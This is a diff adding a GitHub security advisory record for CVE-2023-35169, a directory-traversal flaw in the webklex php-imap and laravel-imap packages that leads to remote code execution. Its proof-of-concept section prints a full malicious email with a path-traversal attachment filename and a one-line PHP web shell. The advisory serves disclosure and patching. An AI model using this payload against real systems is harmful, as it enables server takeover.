@@ -1,0 +1,96 @@
+{
+  "schema_version": "1.4.0",
+  "id": "GHSA-47p7-xfcc-4pv9",
+  "modified": "2023-06-21T21:58:58Z",
+  "published": "2023-06-21T21:58:58Z",
+  "aliases": [
+    "CVE-2023-35169"
+  ],
+  "summary": "php-imap vulnerable to RCE through a directory traversal vulnerability",
+  "details": "### Summary\nAn unsanitized attachment filename allows any unauthenticated user to leverage a directory traversal vulnerability which results in a remote code execution vulnerability.\n\n### Details\nAn attacker can send an email with a malicious attachment to the inbox, which gets crawled with webklex/php-imap or webklex/laravel-imap. Prerequisite for the vulnerability is that the script stores the attachments without providing a `$filename`, or providing an unsanitized `$filename`, in `src/Attachment::save(string $path, string $filename = null)` (https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255).\nIn this case, where no `$filename` gets passed into the `Attachment::save()` method, the package would use a series of unsanitized and insecure input values from the mail as fallback (https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252).\nEven if a developer passes a `$filename` into the `Attachment::save()` method, e.g. by passing the name or filename of the mail attachment itself (from email headers), the input values never get sanitized by the package.\nThere is also no restriction about the file extension (e.g. \".php\") or the contents of a file. This allows an attacker to upload malicious code of any type and content at any location where the underlying user has write permissions.\nThe attacker can also overwrite existing files and inject malicious code into files that, e.g. get executed by the system via cron, requests,...\nThe official documentation only shows examples of `Attachment::save()` without providing the `$filename` (https://www.php-imap.com/api/attachment), which makes this vulnerability even more widespread.\n\n### PoC\n1. send an email with a malicious attachment to an inbox, which gets crawled by the package\n```\nReturn-Path: <attacker@example.com>\nDate: Fri, 17 Aug 2018 14:36:24 +0000\nFrom: Attacker <attacker@example.com>\nTo: Victim <victim@example.com>\nMIME-Version: 1.0\nContent-Type: multipart/mixed;\n boundary=\"_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_\"\n\nMail with malicious attachment\n\n--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_\nContent-Type: application/octet-stream; name=shell.php\nContent-Transfer-Encoding: 8bit\nContent-Disposition: attachment; filename=../../../../../../../../../../../../var/www/shell.php\n\n<?php\n// RCE\nsystem($_GET['cmd'] ?? '#');\n?>\n\n--_=_swift_v4_1534516584_32c032a3715d2dfd5cd84c26f84dba8d_=_--\n\n\n```\n3. crawl email with malicious attachment\n4. store the attachment with `Attachment::save('/path/to/storage')` without providing a `$filename` value\n\n### Impact\nThis is a remote code execution vulnerability that is made possible through a directory traversal vulnerability.\nEvery application that stores attachments with `Attachment::save()` without providing a `$filename` or passing unsanitized user input is affected by this attack.\n",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "webklex/php-imap"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "5.3.0"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "package": {
+        "ecosystem": "Packagist",
+        "name": "webklex/laravel-imap"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "5.3.0"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Webklex/php-imap/security/advisories/GHSA-47p7-xfcc-4pv9"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-35169"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Webklex/php-imap/pull/414"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Webklex/php-imap"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L251-L255"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Webklex/php-imap/blob/5.2.0/src/Attachment.php#L252"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/Webklex/php-imap/releases/tag/5.3.0"
+    }
+  ],
+  "database_specific": {
+    "cwe_ids": [
+      "CWE-22"
+    ],
+    "severity": "CRITICAL",
+    "github_reviewed": true,
+    "github_reviewed_at": "2023-06-21T21:58:58Z",
+    "nvd_published_at": "2023-06-23T21:15:09Z"
+  }
+}
